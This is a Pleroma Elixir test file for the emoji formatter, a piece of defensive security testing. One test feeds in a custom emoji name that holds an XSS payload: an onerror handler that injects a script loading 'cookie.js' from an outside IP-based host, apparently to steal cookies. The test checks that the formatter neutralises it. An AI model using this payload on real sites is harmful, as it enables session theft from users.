# Pleroma: A lightweight social networking server
# Copyright © 2017-2021 Pleroma Authors <https://pleroma.social/>
# SPDX-License-Identifier: AGPL-3.0-only

defmodule Pleroma.Emoji.FormatterTest do
  alias Pleroma.Emoji.Formatter
  use Pleroma.DataCase, async: true

  describe "emojify" do
    test "it adds cool emoji" do
      text = "I love :firefox:"

      expected_result =
        "I love <img class=\"emoji\" alt=\"firefox\" title=\"firefox\" src=\"/emoji/Firefox.gif\"/>"

      assert Formatter.emojify(text) == expected_result
    end

    test "it does not add XSS emoji" do
      text =
        "I love :'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a):"

      custom_emoji =
        {
          "'onload=\"this.src='bacon'\" onerror='var a = document.createElement(\"script\");a.src=\"//51.15.235.162.xip.io/cookie.js\";document.body.appendChild(a)",
          "https://placehold.it/1x1"
        }
        |> Pleroma.Emoji.build()

      refute Formatter.emojify(text, [{custom_emoji.code, custom_emoji}]) =~ text
    end
  end

  describe "get_emoji_map" do
    test "it returns the emoji used in the text" do
      assert Formatter.get_emoji_map("I love :firefox:") == %{
               "firefox" => "http://localhost:4001/emoji/Firefox.gif"
             }
    end

    test "it returns a nice empty result when no emojis are present" do
      assert Formatter.get_emoji_map("I love moominamma") == %{}
    end

    test "it doesn't die when text is absent" do
      assert Formatter.get_emoji_map(nil) == %{}
    end
  end
end
